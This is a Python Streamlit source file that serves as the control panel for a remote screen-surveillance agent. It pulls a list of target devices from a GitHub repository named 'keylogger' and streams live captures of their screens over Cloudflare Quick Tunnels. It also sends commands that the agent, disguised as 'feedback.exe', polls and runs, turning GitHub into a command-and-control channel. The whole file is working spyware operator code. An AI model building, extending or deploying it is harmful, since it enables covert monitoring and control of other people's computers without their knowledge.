"""
screenviewer.py  –  Real-time Screen Viewer via Cloudflare Quick Tunnel
=======================================================================
Run:  streamlit run screenviewer.py

Architecture
------------
  Agent (feedback.exe)            GitHub Registry              This Streamlit App
  ────────────────────   ─────────────────────────────   ──────────────────────────────
  Starts MJPEG server             live/{id}/tunnel.json   Viewer reads device list
  on localhost:{port}   ────────→ {stream_url, online…}  from GitHub registry
                                                          then opens stream URL directly
  Runs cloudflared.exe                                           ↓
  → random tunnel URL                                   Browser renders MJPEG natively
    abc-xyz.trycloudflare.com                           (~0.5 s latency, no intermediary)

No Cloudflare account required.  No R2 bucket.  No API keys on the target machine.
Viewer only needs a GitHub token to read the device registry (one authenticated GET).
After that, the stream itself is a plain HTTP connection to the tunnel URL.
"""

import base64
import json
import time
from datetime import datetime
from io import BytesIO

import requests
import streamlit as st
from PIL import Image

# ──────────────────────────────────────────────────────────────────
# GitHub registry helpers
# ──────────────────────────────────────────────────────────────────
REPO     = "bebedudu/keylogger"
BRANCH   = "main"
API_BASE = "https://api.github.com"


def _gh_headers(token: str) -> dict:
    return {"Authorization": f"token {token}", "Accept": "application/vnd.github.v3+json"}


def _gh_get_json(path: str, token: str) -> dict | None:
    url = f"{API_BASE}/repos/{REPO}/contents/{path}"
    try:
        r = requests.get(url, headers=_gh_headers(token), timeout=10)
        if r.status_code == 200:
            return json.loads(base64.b64decode(r.json()["content"]).decode())
    except Exception:
        pass
    return None


def list_devices(token: str) -> list[dict]:
    """
    Return a list of device registry dicts from live/*/tunnel.json.
    Each dict contains: unique_id, username, stream_url, snapshot_url,
                        status_url, tunnel_url, timestamp, online.
    """
    url = f"{API_BASE}/repos/{REPO}/contents/uploads/live"
    devices = []
    try:
        r = requests.get(url, headers=_gh_headers(token), timeout=10)
        if r.status_code != 200:
            return devices
        for item in r.json():
            if item["type"] != "dir":
                continue
            uid = item["name"]
            info = _gh_get_json(f"uploads/live/{uid}/tunnel.json", token)
            if info:
                info["_dir_name"] = uid   # remember folder name for command writes
                devices.append(info)
    except Exception:
        pass
    return devices


def fetch_snapshot(snapshot_url: str) -> Image.Image | None:
    """Fetch a single JPEG snapshot from the tunnel /snapshot endpoint."""
    try:
        r = requests.get(snapshot_url, timeout=8)
        if r.status_code == 200:
            return Image.open(BytesIO(r.content))
    except Exception:
        pass
    return None


def fetch_tunnel_status(status_url: str) -> dict | None:
    """Fetch JSON from the tunnel /status endpoint."""
    try:
        r = requests.get(status_url, timeout=5)
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return None


def _write_command(dir_name: str, token: str, action: str) -> bool:
    """
    Write a command file to uploads/live/{dir_name}/command.json.
    The agent polls this file and executes the requested action.
    Returns True on success.
    """
    path = f"uploads/live/{dir_name}/command.json"
    file_url = f"{API_BASE}/repos/{REPO}/contents/{path}"
    headers = _gh_headers(token)
    payload_data = json.dumps({"action": action, "requested_at": datetime.utcnow().isoformat()}, indent=2).encode()
    # Check if file already exists (need SHA to overwrite)
    sha = None
    try:
        r = requests.get(file_url, headers=headers, timeout=10)
        if r.status_code == 200:
            sha = r.json().get("sha")
    except Exception:
        pass
    body = {
        "message": f"[viewer] command {action} for {dir_name}",
        "content": base64.b64encode(payload_data).decode(),
        "branch": BRANCH,
    }
    if sha:
        body["sha"] = sha
    try:
        r = requests.put(file_url, headers=headers, json=body, timeout=15)
        return r.status_code in (200, 201)
    except Exception:
        return False

# ──────────────────────────────────────────────────────────────────
# Page config
# ──────────────────────────────────────────────────────────────────
st.set_page_config(
    page_title="Screen Viewer",
    page_icon="🖥️",
    layout="wide",
    initial_sidebar_state="expanded",
)

# ──────────────────────────────────────────────────────────────────
# Session state defaults
# ──────────────────────────────────────────────────────────────────
for k, v in {
    "viewing": False,
    "device": None,
    "frame_count": 0,
}.items():
    if k not in st.session_state:
        st.session_state[k] = v

# ──────────────────────────────────────────────────────────────────
# Sidebar
# ──────────────────────────────────────────────────────────────────
with st.sidebar:
    st.title("🖥️ Screen Viewer")
    st.caption("Powered by Cloudflare Quick Tunnel")
    st.divider()

    token = st.text_input(
        "GitHub Token",
        type="password",
        help="Read-only repo scope is enough. Used only to fetch the device registry.",
    )
    if not token:
        st.info("Enter your GitHub token to load the device list.")
        st.stop()

    # ── Device list ──────────────────────────────────────────────
    st.subheader("Devices")
    with st.spinner("Loading device registry…"):
        devices = list_devices(token)

    if not devices:
        st.warning("No devices registered yet (live/ folder is empty).")
        st.stop()

    # Build display labels:  "username  [abc12345]  ● online"
    # Short ID (first 8 chars) ensures devices with the same username are distinguishable.
    def _label(d: dict) -> str:
        badge    = "● online" if d.get("online") else "○ offline"
        uid      = d.get("unique_id", "")
        short_id = uid[:8] if uid else "?"
        name     = d.get("username", uid) or uid
        return f"{name}  [{short_id}]  {badge}"

    labels  = [_label(d) for d in devices]
    idx     = st.selectbox("Select device", range(len(labels)), format_func=lambda i: labels[i])
    device  = devices[idx]

    # ── Device card ──────────────────────────────────────────────
    st.caption(
        f"**UUID:** `{device['unique_id']}`  \n"
        f"**User:** {device.get('username', 'N/A')}  \n"
        f"**Tunnel:** `{device.get('tunnel_url', 'N/A')}`  \n"
        f"**Registered:** {device.get('timestamp', 'N/A')[:19]}"
    )
    st.divider()

    st.divider()
    st.caption(
        "Click **Watch in browser** on the main page — "
        "click through the one-time Cloudflare warning, then the stream auto-starts."
    )
    if st.button("🔄 Refresh device list", use_container_width=True):
        st.rerun()

# ──────────────────────────────────────────────────────────────────
# Main content
# ──────────────────────────────────────────────────────────────────
stream_url   = device.get("stream_url", "")
snapshot_url = device.get("snapshot_url", "")
status_url   = device.get("status_url", "")

if not stream_url:
    st.error("Device has no stream_url registered. Make sure feedback.exe is running on the target.")
    st.stop()

st.subheader(
    f"{'🟢' if device.get('online') else '🔴'}  "
    f"{device.get('username', device['unique_id'])}  "
    f"—  `{device['unique_id']}`"
)

# Show direct URLs for convenience
with st.expander("Direct stream URLs", expanded=False):
    st.markdown(
        f"| Endpoint | URL |\n"
        f"|---|---|\n"
        f"| 🎬 MJPEG stream | `{stream_url}` |\n"
        f"| 📸 Single snapshot | `{snapshot_url}` |\n"
        f"| ℹ️ Status JSON | `{status_url}` |"
    )
    st.markdown(
        f"[Open stream in new tab]({stream_url})  ·  "
        f"[Open snapshot]({snapshot_url})"
    )

st.divider()

# ── How to view ───────────────────────────────────────────────────
st.markdown(
    """
    ### How to watch the live stream

    1. Click **Watch in browser** below — the Cloudflare tunnel URL opens in a new tab.
    2. **Cloudflare shows a one-time warning page** — click the button to proceed.
       (This is normal for Quick Tunnels. It only happens once per browser session.)
    3. The browser loads a built-in HTML viewer that **auto-starts the MJPEG stream**.
    4. Done — you are watching the screen in real-time at ~2 FPS.

    > The warning page appears because Cloudflare Quick Tunnels are intended for development.
    > After clicking through once, the stream runs with ~0.5 s latency directly from the
    > target machine — no intermediary storage.
    """
)

col_watch, col_snap, col_status, col_regen = st.columns(4)

with col_watch:
    st.link_button(
        "🎬  Watch in browser",
        device.get("tunnel_url", stream_url),
        use_container_width=True,
        type="primary",
    )
    st.caption("Opens the built-in HTML viewer (best experience)")

with col_snap:
    st.link_button(
        "📸  Single snapshot",
        snapshot_url,
        use_container_width=True,
    )
    st.caption("One JPEG frame — useful for a quick check")

with col_status:
    st.link_button(
        "ℹ️  Status JSON",
        status_url,
        use_container_width=True,
    )
    st.caption("Device heartbeat & metadata")

with col_regen:
    if st.button("🔄  Regenerate tunnel", use_container_width=True,
                 help="Ask the agent to kill the current Cloudflare tunnel and create a new one."):
        dir_name = device.get("_dir_name", "")
        if not dir_name:
            st.error("Cannot determine device folder name.")
        else:
            with st.spinner("Sending regenerate command to device…"):
                ok = _write_command(dir_name, token, "regenerate_tunnel")
            if ok:
                st.success(
                    "✅ Command sent! The agent will create a new tunnel within ~15 s. "
                    "Click **Refresh device list** in the sidebar once done to get the new URL."
                )
            else:
                st.error("Failed to write command to GitHub. Check your token has write access.")
    st.caption("Use when the current tunnel is broken")

st.divider()

# ── Snapshot preview (Python-side polling, works after interstitial cookie is set) ──
st.subheader("Snapshot preview (optional)")
st.caption(
    "This polls `/snapshot` from Python every few seconds. It works **after** you have "
    "opened the tunnel URL in your browser at least once (so Cloudflare sets the session "
    "cookie). Before that first visit, requests will be blocked by the interstitial."
)

snap_interval = st.slider("Refresh interval (s)", 1, 15, 4)

if st.button("▶ Start snapshot preview", type="primary"):
    st.session_state["viewing"] = True

if st.button("⏹ Stop"):
    st.session_state["viewing"] = False

if st.session_state.get("viewing"):
    status_bar = st.empty()
    img_holder = st.empty()
    meta_bar   = st.empty()

    # Use a requests Session to carry cookies across calls
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})

    while st.session_state.get("viewing"):
        ts = datetime.now().strftime("%H:%M:%S")
        try:
            resp = session.get(snapshot_url, timeout=8)
            if resp.status_code == 200 and resp.headers.get("Content-Type", "").startswith("image"):
                st.session_state["frame_count"] += 1
                img = Image.open(BytesIO(resp.content))
                status_bar.success(
                    f"🟢 Live  |  Frame #{st.session_state['frame_count']}  |  "
                    f"Updated {ts}  |  Refresh every {snap_interval} s"
                )
                img_holder.image(img, caption=f"{device.get('username','?')} — {ts}",
                                 use_container_width=True)
                meta_bar.caption(f"Resolution: {img.width}×{img.height}  |  "
                                 f"Size: {len(resp.content)//1024} KB")
            else:
                status_bar.warning(
                    f"⏳ Got HTTP {resp.status_code} — "
                    "open the Watch URL in your browser first to bypass the Cloudflare warning."
                )
        except Exception as e:
            status_bar.error(f"Request failed: {e}")
        time.sleep(snap_interval)
        st.rerun()
